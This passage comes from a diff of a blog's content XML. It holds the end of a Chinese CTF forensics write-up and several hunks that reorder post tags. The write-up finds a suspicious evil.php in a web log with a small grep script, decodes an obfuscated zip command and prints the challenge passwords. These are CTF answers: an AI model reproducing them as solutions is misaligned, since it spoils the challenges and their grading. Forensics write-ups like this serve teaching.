src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-6.png"></p><p>密码为向晚0612</p><h1 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h1><p>分析文件发现evil.php文件比较可疑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;my_site.log&#x27;</span>)<br>d=f.readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;evil.php&#x27;</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>使用脚本获取evil.php文件的日志</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">45</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">50</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">73</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)]))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-8.png"></p><p>密码为hehehe233_Igotroot</p>]]></content>
     
     
     <categories>
@@ -1636,11 +1636,11 @@
     
     <tags>
       
-      <tag>buu</tag>
-      
       <tag>sql防护</tag>
       
       <tag>加固</tag>
+      
+      <tag>buu</tag>
       
     </tags>
     
@@ -1831,9 +1831,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
       <tag>web入门</tag>
       
@@ -1968,9 +1968,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
     </tags>
     
@@ -1995,9 +1995,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
     </tags>
     
@@ -2049,9 +2049,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
     </tags>
     
@@ -2153,9 +2153,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
       <tag>web入门</tag>
       
@@ -2182,9 +2182,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
     </tags>
     
@@ -2209,9 +2209,9 @@
     
     <tags>
       
-      <tag>misc</tag>
-      
       <tag>buu</tag>
+      
+      <tag>misc</tag>
       
     </tags>
     
@@ -2236,9 +2236,9 @@
     
     <tags>
       
-      <tag>misc</tag>
-      
       <tag>buu</tag>
+      
+      <tag>misc</tag>
       
     </tags>
     
@@ -2263,9 +2263,9 @@
     
     <tags>
       
-      <tag>misc</tag>
-      
       <tag>buu</tag>
+      
+      <tag>misc</tag>
       
     </tags>
     
